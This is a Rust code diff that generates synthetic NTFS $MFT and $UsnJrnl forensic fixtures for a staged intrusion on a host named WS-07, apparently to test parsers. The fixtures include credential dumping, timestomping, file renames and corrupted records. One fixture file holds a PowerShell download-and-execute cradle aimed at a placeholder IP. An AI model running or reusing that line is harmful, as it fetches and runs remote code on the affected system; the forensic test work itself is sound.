@@ -3,6 +3,8 @@
 //! ```text
 //! evtx-gen fixtures --out fixtures/synthetic      # small, deterministic, committed
 //! evtx-gen corpus --out corpus --size 2G          # multi-GB benchmark corpus
+//! evtx-gen ntfs --out fixtures/ntfs               # $MFT + $J fixtures (same scenario)
+//! evtx-gen ntfs-corpus --out corpus/ntfs --records 1000000
 //! ```
 //!
 //! No real log data is involved: every value comes from a seeded generator
@@ -12,6 +14,7 @@
 #![allow(clippy::too_many_arguments)]
 
 mod events;
+mod ntfs;
 mod writer;
 
 use std::fs::File;
@@ -49,6 +52,22 @@ enum Cmd {
         /// Maximum size of one file.
         #[arg(long, default_value = "256M")]
         file_size: String,
+        #[arg(long, default_value_t = 1)]
+        seed: u64,
+    },
+    /// `$MFT` and `$Extend/$J` of WS-07's C: volume for the same attack
+    /// scenario, plus corrupt and truncated variants.
+    Ntfs {
+        #[arg(long, default_value = "fixtures/ntfs")]
+        out: PathBuf,
+    },
+    /// A large `$MFT` and `$J` of background activity.
+    NtfsCorpus {
+        #[arg(long, default_value = "corpus/ntfs")]
+        out: PathBuf,
+        /// MFT records (1 KiB each).
+        #[arg(long, default_value_t = 1_000_000)]
+        records: u64,
         #[arg(long, default_value_t = 1)]
         seed: u64,
     },
@@ -920,9 +939,282 @@ fn corpus(out: &Path, size: u64, file_size: u64, seed: u64) -> anyhow::Result<()
     Ok(())
 }
 
+/// 2023-06-01T00:00:00.1234567Z (OS install) as FILETIME.
+const INSTALL: u64 = (1_685_577_600 + 11_644_473_600) * SEC + 1_234_567;
+
+/// WS-07's C: volume: a small Windows tree, background files, and the
+/// scenario's file activity (see `scenario` for the matching event logs):
+/// 10:15 `u.ps1` downloaded (Zone.Identifier with the cradle URL), 10:18
+/// `lsass.dmp` written then deleted at 10:29, 10:22 `PSEXESVC.exe` with a
+/// faked $SI creation time, 10:24 `m.exe` renamed `WinUpdate.exe`, 10:31
+/// `cleanup.bat` created and deleted after the log was cleared.
+fn ntfs_fixtures(out: &Path) -> anyhow::Result<()> {
+    use ntfs::{UsnRec, Volume, reason::*};
+    let mut rng = Rng::new(4242);
+    let t = |m: u64, s_: u64| BASE + (2 * 3600 + m * 60 + s_) * SEC + 1_234_567;
+    let inst = [INSTALL; 4];
+    let mut v = Volume::new(INSTALL);
+    let windows = v.add(5, "Windows", true, inst);
+    let sys32 = v.add(windows, "System32", true, inst);
+    let wpsdir = v.add(sys32, "WindowsPowerShell", true, inst);
+    let wpsv1 = v.add(wpsdir, "v1.0", true, inst);
+    let wtemp = v.add(windows, "Temp", true, inst);
+    let users = v.add(5, "Users", true, inst);
+    let public = v.add(users, "Public", true, inst);
+    let profile = BASE - 55 * 86_400 * SEC + 7_654_321;
+    let admin = v.add(users, "administrator", true, [profile; 4]);
+    let docs = v.add(admin, "Documents", true, [profile; 4]);
+    let appdata = v.add(admin, "AppData", true, [profile; 4]);
+    let local = v.add(appdata, "Local", true, [profile; 4]);
+    let atemp = v.add(local, "Temp", true, [profile; 4]);
+    let _progdata = v.add(5, "ProgramData", true, inst);
+    for (name, size) in [
+        ("cmd.exe", 289_792u64),
+        ("whoami.exe", 77_824),
+        ("net.exe", 59_904),
+        ("nltest.exe", 543_744),
+        ("svchost.exe", 57_360),
+        ("lsass.exe", 82_632),
+        ("notepad.exe", 201_216),
+    ] {
+        let e = v.add(sys32, name, false, inst);
+        v.node(e).size = size;
+    }
+    let e = v.add(wpsv1, "powershell.exe", false, inst);
+    v.node(e).size = 450_560;
+    for i in 0..1100u64 {
+        let e = v.add(sys32, &format!("lib{i:04}.dll"), false, inst);
+        v.node(e).size = 4096 + rng.below(2_000_000);
+    }
+    for i in 0..120u64 {
+        let ct = profile + rng.below(50 * 86_400) * SEC + rng.below(SEC);
+        let mt = ct + rng.below(5 * 86_400) * SEC;
+        let e = v.add(
+            docs,
+            &format!("report-{i:03}.docx"),
+            false,
+            [ct, mt, mt, mt],
+        );
+        v.node(e).size = 10_000 + rng.below(900_000);
+    }
+
+    // The attack, in MFT state after the fact.
+    let script =
+        b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\r\n".to_vec();
+    let u_t = [t(15, 2), t(15, 3), t(15, 3), t(15, 3)];
+    let u = v.add(public, "u.ps1", false, u_t);
+    v.node(u).size = script.len() as u64;
+    v.node(u).content = Some(script);
+    v.node(u).ads.push((
+        "Zone.Identifier".into(),
+        b"[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=http://198.51.100.7/a.ps1\r\n".to_vec(),
+    ));
+    let dump = v.add(
+        public,
+        "lsass.dmp",
+        false,
+        [t(18, 3), t(18, 9), t(18, 9), t(18, 9)],
+    );
+    v.node(dump).size = 48_234_496;
+    // Faked $SI creation/modification (zero sub-seconds, years earlier); the
+    // $FILE_NAME times keep the real copy time.
+    let stomp = (1_553_005_391 + 11_644_473_600) * SEC; // 2019-03-19T14:23:11Z
+    let psx = v.add(
+        windows,
+        "PSEXESVC.exe",
+        false,
+        [stomp, stomp, t(22, 0), t(22, 0)],
+    );
+    v.node(psx).fname = [t(21, 58); 4];
+    v.node(psx).size = 194_432;
+    let ren = v.add(
+        wtemp,
+        "WinUpdate.exe",
+        false,
+        [t(23, 40), t(23, 41), t(24, 0), t(24, 0)],
+    );
+    v.node(ren).fname = [t(23, 40), t(23, 41), t(24, 0), t(24, 0)];
+    v.node(ren).size = 1_250_304;
+    let bat = v.add(
+        wtemp,
+        "cleanup.bat",
+        false,
+        [t(31, 0), t(31, 1), t(31, 1), t(31, 1)],
+    );
+    v.node(bat).size = 312;
+    v.node(bat).content = Some(vec![b'@'; 312]);
+
+    // Journal: background churn plus the scenario's changes.
+    let mut recs = ntfs::churn(&v, &[wtemp, atemp], 1600, BASE, &mut rng);
+    let mut add =
+        |entry: u64, seq: u16, parent: u64, ts: u64, reason: u32, name: &str, v3: bool| {
+            recs.push(UsnRec {
+                entry,
+                seq,
+                parent,
+                parent_seq: v.seq_of(parent),
+                ts,
+                reason,
+                attrs: 0x20,
+                name: name.into(),
+                v3,
+            });
+        };
+    let sq = |e: u64| 1 + (e % 3) as u16;
+    for (dt, r) in [
+        (0, CREATE),
+        (1, CREATE | DATA_EXTEND),
+        (2, CREATE | DATA_EXTEND | NAMED_DATA_EXTEND),
+        (3, CREATE | DATA_EXTEND | NAMED_DATA_EXTEND | CLOSE),
+    ] {
+        add(u, sq(u), public, t(15, 2) + dt, r, "u.ps1", true);
+    }
+    for (ts, r) in [
+        (t(18, 3), CREATE),
+        (t(18, 9), CREATE | DATA_EXTEND | CLOSE),
+        (t(29, 10), DELETE | CLOSE),
+    ] {
+        add(dump, sq(dump), public, ts, r, "lsass.dmp", false);
+    }
+    for (ts, r) in [
+        (t(21, 58), CREATE),
+        (t(21, 59), CREATE | DATA_EXTEND | CLOSE),
+        (t(22, 0), BASIC_INFO),
+        (t(22, 0) + 1, BASIC_INFO | CLOSE),
+    ] {
+        add(psx, sq(psx), windows, ts, r, "PSEXESVC.exe", false);
+    }
+    add(ren, sq(ren), wtemp, t(23, 40), CREATE, "m.exe", false);
+    add(
+        ren,
+        sq(ren),
+        wtemp,
+        t(23, 41),
+        CREATE | DATA_EXTEND | CLOSE,
+        "m.exe",
+        false,
+    );
+    add(ren, sq(ren), wtemp, t(24, 0), RENAME_OLD, "m.exe", false);
+    add(
+        ren,
+        sq(ren),
+        wtemp,
+        t(24, 0) + 1,
+        RENAME_NEW,
+        "WinUpdate.exe",
+        false,
+    );
+    add(
+        ren,
+        sq(ren),
+        wtemp,
+        t(24, 0) + 2,
+        RENAME_NEW | CLOSE,
+        "WinUpdate.exe",
+        false,
+    );
+    for (ts, r) in [
+        (t(31, 0), CREATE),
+        (t(31, 1), CREATE | DATA_EXTEND | CLOSE),
+        (t(31, 5), DELETE | CLOSE),
+    ] {
+        add(bat, sq(bat), wtemp, ts, r, "cleanup.bat", false);
+    }
+    recs.sort_by_key(|r| r.ts);
+    // Deleted files: record freed (in-use flag cleared, sequence bumped).
+    for e in [dump, bat] {
+        let n = v.node(e);
+        n.in_use = false;
+        n.seq += 1;
+    }
+    v.records = v.next_entry() + 64;
+
+    let c = out.join("WS-07/C");
+    std::fs::create_dir_all(c.join("$Extend"))?;
+    let mft = v.mft_bytes();
+    std::fs::write(c.join("$MFT"), &mft)?;
+    let j = ntfs::journal(256 * 1024, &recs);
+    std::fs::write(c.join("$Extend/$J"), &j)?;
+    println!("WS-07/C/$MFT: {} records", mft.len() / ntfs::RECORD);
+    println!(
+        "WS-07/C/$Extend/$J: {} records, {} bytes",
+        recs.len(),
+        j.len()
+    );
+
+    // Damaged variants.
+    let rec = |i: usize| i * ntfs::RECORD;
+    let mut bad = mft.clone();
+    bad[rec(20) + 510] ^= 0xFF; // torn write: fixup mismatch
+    bad[rec(21)..rec(21) + 4].copy_from_slice(b"BAAD");
+    bad[rec(22) + 0x3C..rec(22) + 0x40].copy_from_slice(&[0xFF, 0xFF, 0xFF, 0x7F]); // attribute length
+    bad[rec(23)..rec(23) + 4].copy_from_slice(b"XYZW");
+    std::fs::write(out.join("corrupt.mft"), &bad)?;
+    std::fs::write(out.join("truncated.mft"), &mft[..rec(300) + 500])?;
+    let mut badj = j.clone();
+    let mid = 256 * 1024 + 3 * 4096 + 200;
+    badj[mid..mid + 64].fill(0xAB);
+    std::fs::write(out.join("corrupt_UsnJrnl.bin"), &badj)?;
+    println!("corrupt.mft, truncated.mft, corrupt_UsnJrnl.bin");
+    Ok(())
+}
+
+/// A large volume: a directory tree (one directory per ~12 files) and
+/// background files, plus two journal records per file.
+fn ntfs_corpus(out: &Path, records: u64, seed: u64) -> anyhow::Result<()> {
+    use ntfs::Volume;
+    let mut rng = Rng::new(seed);
+    let mut v = Volume::new(INSTALL);
+    let mut dirs = vec![5u64];
+    while v.next_entry() < records {
+        let parent = *rng.pick(&dirs);
+        let ct = INSTALL + rng.below(280 * 86_400) * SEC + rng.below(SEC);
+        let mt = ct + rng.below(30 * 86_400) * SEC;
+        let at = mt + rng.below(30 * 86_400) * SEC;
+        if rng.below(12) == 0 || dirs.len() < 16 {
+            let e = v.add(
+                parent,
+                &format!("dir{:05}", v.next_entry()),
+                true,
+                [ct, mt, mt, at],
+            );
+            dirs.push(e);
+        } else {
+            let e = v.add(
+                parent,
+                &format!("file{:07}.dat", v.next_entry()),
+                false,
+                [ct, mt, mt, at],
+            );
+            let n = v.node(e);
+            n.size = rng.below(5_000_000);
+            if rng.below(20) == 0 {
+                n.in_use = false;
+            }
+        }
+    }
+    std::fs::create_dir_all(out.join("$Extend"))?;
+    let mft = v.mft_bytes();
+    std::fs::write(out.join("$MFT"), &mft)?;
+    let tmp: Vec<u64> = dirs.iter().copied().take(64).collect();
+    let recs = ntfs::churn(&v, &tmp, (records * 2) as usize, BASE, &mut rng);
+    let j = ntfs::journal(1 << 20, &recs);
+    std::fs::write(out.join("$Extend/$J"), &j)?;
+    println!(
+        "$MFT: {} MiB, {} records; $J: {} MiB, {} records",
+        mft.len() >> 20,
+        records,
+        j.len() >> 20,
+        recs.len()
+    );
+    Ok(())
+}
+
 fn main() -> anyhow::Result<()> {
     match Cli::parse().cmd {
         Cmd::Fixtures { out } => fixtures(&out),
+        Cmd::Ntfs { out } => ntfs_fixtures(&out),
+        Cmd::NtfsCorpus { out, records, seed } => ntfs_corpus(&out, records, seed),
         Cmd::Corpus {
             out,
             size,
